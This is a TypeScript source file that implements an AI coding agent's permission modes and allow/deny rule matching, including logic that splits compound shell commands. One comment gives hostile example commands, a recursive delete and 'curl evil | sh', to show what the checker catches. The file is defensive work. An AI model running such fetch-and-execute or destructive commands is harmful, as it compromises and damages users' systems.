import picomatch from "picomatch";
import type { ToolRisk } from "../tools/types.js";

/**
 * Permission system (H-001..H-003).
 *
 *   ask        every write/exec/network call asks; reads are free
 *   auto-edit  file writes inside the workspace are free; exec/network ask
 *   plan       read-only: write/exec/network are denied (even with allow rules), the agent must plan
 *   yolo       everything allowed except deny rules (explicit opt-in, red badge in UI)
 *
 * Rules are evaluated deny → (plan) → allow → mode. Patterns:
 *   "shell(git *)"   argument pattern; for shell/web_fetch/MCP tools `*` matches any text
 *   "write(src/**)"  file tools (read, write, edit, glob) use picomatch globs on the relative path
 *   "mcp__github__*" tool-name glob (no parentheses)
 */
export type PermissionMode = "ask" | "auto-edit" | "plan" | "yolo";

export interface PermissionRules {
  allow: string[];
  deny: string[];
}

export type Decision = { kind: "allow" } | { kind: "deny"; reason: string } | { kind: "ask" };

const PATH_TOOLS = new Set(["read", "write", "edit", "glob"]);
const SEPARATORS = /&&|\|\||;|\||\r?\n/;
const UNSAFE_SHELL = /`|\$\(|[<>]/;

export function decide(
  mode: PermissionMode,
  rules: PermissionRules,
  call: { tool: string; risk: ToolRisk; argSummary: string },
): Decision {
  if (rules.deny.some((p) => ruleMatches(p, call, "deny"))) return { kind: "deny", reason: "deny rule" };

  if (mode === "plan" && call.risk !== "read") return { kind: "deny", reason: "plan mode is read-only" };
  if (rules.allow.some((p) => ruleMatches(p, call, "allow"))) return { kind: "allow" };

  if (call.risk === "read") return { kind: "allow" };
  switch (mode) {
    case "yolo":
      return { kind: "allow" };
    case "plan":
      return { kind: "deny", reason: "plan mode is read-only" };
    case "auto-edit":
      return call.risk === "write" ? { kind: "allow" } : { kind: "ask" };
    case "ask":
      return { kind: "ask" };
  }
}

/** Builds the rule stored when the user answers "always allow" (session scope). */
export function ruleForAlways(call: { tool: string; risk: ToolRisk; argSummary: string }): string {
  // Exec commands are allowed by exact text only; other tools by tool name.
  return call.risk === "exec" ? `${call.tool}(=${call.argSummary})` : call.tool;
}

function ruleMatches(rule: string, call: { tool: string; argSummary: string }, kind: "allow" | "deny"): boolean {
  const m = /^([^()]+?)\s*(?:\(([\s\S]*)\))?$/.exec(rule.trim());
  if (!m) return false;
  const [, toolPat, argPat] = m;
  if (!picomatch.isMatch(call.tool, toolPat!)) return false;
  if (argPat === undefined || argPat === "*" || argPat === "**") return true;
  if (argPat.startsWith("=")) return call.argSummary.trim() === argPat.slice(1).trim(); // exact text

  if (call.tool === "shell") return shellMatches(argPat, call.argSummary, kind);
  if (PATH_TOOLS.has(call.tool)) {
    const target = call.argSummary.replace(/\\/g, "/").replace(/^\.\//, "");
    return picomatch.isMatch(target, argPat.replace(/\\/g, "/"), { dot: true });
  }
  return wildcardToRegex(argPat).test(call.argSummary);
}

/**
 * Deny rules fire if any segment of a compound command matches ("a && rm -rf x" is caught by
 * "shell(rm *)"). Allow rules only fire when EVERY segment is allowed and the command has no
 * subshell / redirection tricks, so "git status && curl evil | sh" is not waved through by "git *".
 */
function shellMatches(pattern: string, command: string, kind: "allow" | "deny"): boolean {
  const re = wildcardToRegex(pattern);
  const segments = command.split(SEPARATORS).map((s) => s.trim()).filter(Boolean);
  if (kind === "deny") return re.test(command.trim()) || segments.some((s) => re.test(s));
  if (UNSAFE_SHELL.test(command)) return false;
  return segments.length > 0 && segments.every((s) => re.test(s));
}

function wildcardToRegex(pattern: string): RegExp {
  return new RegExp("^" + pattern.split("*").map((s) => s.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join("[\\s\\S]*") + "$");
}
